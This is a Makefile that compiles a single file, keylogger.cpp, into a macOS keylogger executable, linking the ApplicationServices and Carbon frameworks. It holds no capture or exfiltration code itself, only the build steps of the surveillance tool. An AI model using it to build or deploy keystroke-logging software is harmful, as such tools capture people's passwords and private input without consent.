CC=g++
CFLAGS=-framework ApplicationServices -framework Carbon -lpthread
SOURCES=keylogger.cpp
EXECUTABLE=keylogger

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

clean:
	rm $(EXECUTABLE)